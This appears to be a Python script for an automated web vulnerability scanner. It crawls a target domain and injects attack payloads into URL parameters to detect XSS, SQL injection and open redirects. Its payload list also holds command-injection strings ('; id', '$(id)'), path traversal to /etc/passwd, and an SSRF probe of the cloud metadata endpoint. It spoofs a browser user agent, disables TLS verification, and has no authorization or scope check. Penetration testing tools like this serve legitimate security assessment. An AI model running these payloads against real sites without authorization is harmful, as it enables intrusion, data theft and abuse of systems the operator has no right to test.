
import asyncio
import aiohttp
import argparse
import time
import re
import json
import os
from urllib.parse import urlparse, urljoin, parse_qs, quote
from typing import Set, List, Dict, Any, Optional
from dataclasses import dataclass, field

# --- Enhanced Logger ---
class EnhancedLogger:
    def __init__(self, domain: str):
        self.domain = domain
        self.timestamp = int(time.time())
        self.log_dir = f"logs_{self.domain}_{self.timestamp}"
        os.makedirs(self.log_dir, exist_ok=True)
        
        self.main_log = os.path.join(self.log_dir, "main_scan.log")
        self.vuln_log = os.path.join(self.log_dir, "vulnerabilities.json")
        self.potential_vuln_log = os.path.join(self.log_dir, "potential_vulnerabilities.log")
        
        self.findings = []

    def log(self, message: str, level: str = 'INFO'):
        timestamp_str = time.strftime('%Y-%m-%d %H:%M:%S')
        prefix = {
            'INFO': '[*]', 
            'FOUND': '[+]', 
            'ERROR': '[!]', 
            'DEBUG': '[-]', 
            'VULN': '[V]', 
            'POTENTIAL': '[?]'
        }.get(level, '[*]')
        
        log_entry = f"{timestamp_str} {prefix} {message}"
        print(log_entry)
        with open(self.main_log, 'a') as f:
            f.write(log_entry + '\n')

    def add_vulnerability(self, finding: Dict[str, Any]):
        # Deduplicate findings
        finding_id = f"{finding['type']}-{finding['url']}-{finding.get('parameter', '')}"
        if any(f"{f['type']}-{f['url']}-{f.get('parameter', '')}" == finding_id for f in self.findings):
            return

        self.findings.append(finding)
        confidence = finding.get('confidence', 'Low')
        
        if confidence == 'High':
            self.log(f"CONFIRMED VULNERABILITY: {finding['type']} on {finding['url']} (Param: {finding.get('parameter', 'N/A')})", 'VULN')
        else:
            self.log(f"POTENTIAL VULNERABILITY: {finding['type']} on {finding['url']} (Param: {finding.get('parameter', 'N/A')})", 'POTENTIAL')
            with open(self.potential_vuln_log, 'a') as f:
                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {json.dumps(finding)}\n")

        with open(self.vuln_log, 'w') as f:
            json.dump(self.findings, f, indent=4)

# --- Vulnerability Scanner Engine ---
class VulnerabilityScanner:
    def __init__(self, session: aiohttp.ClientSession, logger: EnhancedLogger, timeout: int = 10):
        self.session = session
        self.logger = logger
        self.timeout = timeout
        self.headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"}
        
        self.payloads = {
            "xss": ["<script>alert(1)</script>", "'\"><script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)", "<svg/onload=alert(1)>"],
            "sqli": ["' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "' UNION SELECT NULL,NULL,NULL--", "sleep(5)#", "'; WAITFOR DELAY '0:0:5'--"],
            "lfi": ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "/etc/passwd\0", "php://filter/convert.base64-encode/resource=index.php"],
            "ssrf": ["http://169.254.169.254/latest/meta-data/", "http://localhost:80", "http://127.0.0.1:22"],
            "rce": ["; id", "| id", "`id`", "$(id)", "; whoami"],
            "open_redirect": ["https://google.com", "//google.com", "/%09/google.com", "/%5cgoogle.com"]
        }

    async def check_xss(self, base_url: str, params: Dict[str, str]):
        for param in params:
            for payload in self.payloads["xss"]:
                test_params = params.copy()
                test_params[param] = payload
                try:
                    async with self.session.get(base_url, params=test_params, headers=self.headers, timeout=self.timeout, ssl=False) as resp:
                        content = await resp.text()
                        if payload in content or quote(payload) in content or quote(payload, safe='') in content:
                            self.logger.add_vulnerability({
                                "type": "XSS", "url": str(resp.url), "parameter": param, "payload": payload,
                                "confidence": "High" if "<script>" in content or "onerror=" in content else "Medium"
                            })
                except: continue

    async def check_sqli(self, base_url: str, params: Dict[str, str]):
        sql_errors = ["SQL syntax", "mysql_fetch", "ORA-01756", "SQLite3::query", "PostgreSQL query failed"]
        for param in params:
            for payload in self.payloads["sqli"]:
                test_params = params.copy()
                test_params[param] = payload
                try:
                    start_time = asyncio.get_event_loop().time()
                    async with self.session.get(base_url, params=test_params, headers=self.headers, timeout=self.timeout, ssl=False) as resp:
                        content = await resp.text()
                        end_time = asyncio.get_event_loop().time()
                        for error in sql_errors:
                            if error.lower() in content.lower():
                                self.logger.add_vulnerability({"type": "SQLi (Error-based)", "url": str(resp.url), "parameter": param, "payload": payload, "confidence": "High"})
                                break
                        if end_time - start_time > 4 and "sleep" in payload.lower():
                            self.logger.add_vulnerability({"type": "SQLi (Time-based)", "url": str(resp.url), "parameter": param, "payload": payload, "confidence": "Medium"})
                except: continue

    async def check_open_redirect(self, base_url: str, params: Dict[str, str]):
        for param in params:
            for payload in self.payloads["open_redirect"]:
                test_params = params.copy()
                test_params[param] = payload
                try:
                    async with self.session.get(base_url, params=test_params, headers=self.headers, timeout=self.timeout, ssl=False, allow_redirects=False) as resp:
                        if resp.status in [301, 302, 303, 307, 308]:
                            location = resp.headers.get("Location", "")
                            if "google.com" in location:
                                self.logger.add_vulnerability({"type": "Open Redirect", "url": str(resp.url), "parameter": param, "payload": payload, "confidence": "High"})
                except: continue

    async def scan_url(self, url: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        flat_params = {k: v[0] for k, v in params.items()}
        if not flat_params: return
        base_url = url.split('?')[0]
        await asyncio.gather(
            self.check_xss(base_url, flat_params),
            self.check_sqli(base_url, flat_params),
            self.check_open_redirect(base_url, flat_params)
        )

# --- Main Suite ---
class EnhancedPentestingSuite:
    def __init__(self, domain: str, threads: int = 50):
        self.domain = domain
        self.threads = threads
        self.logger = EnhancedLogger(domain)
        self.scanned_urls = set()
        self.found_urls = set()

    async def crawl(self, session: aiohttp.ClientSession, url: str, scanner: VulnerabilityScanner, depth: int = 2):
        if depth == 0 or url in self.found_urls: return
        self.found_urls.add(url)
        try:
            async with session.get(url, timeout=10, ssl=False) as resp:
                if resp.status != 200: return
                if '?' in str(resp.url): await scanner.scan_url(str(resp.url))
                content = await resp.text()
                links = re.findall(r'(?:href|src|url)=["\'](.*?)(?:["\']| )', content)
                for link in links:
                    abs_link = urljoin(url, link)
                    if urlparse(abs_link).netloc.endswith(self.domain):
                        await self.crawl(session, abs_link, scanner, depth - 1)
        except: pass

    async def run(self):
        self.logger.log(f"Starting Enhanced Pentesting Suite for {self.domain}")
        async with aiohttp.ClientSession() as session:
            scanner = VulnerabilityScanner(session, self.logger)
            # In a real scenario, we'd start with subdomains. For now, we start with the main domain.
            start_url = f"http://{self.domain}"
            await self.crawl(session, start_url, scanner)
        self.logger.log("Scan Completed!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", required=True)
    args = parser.parse_args()
    asyncio.run(EnhancedPentestingSuite(domain=args.domain).run())
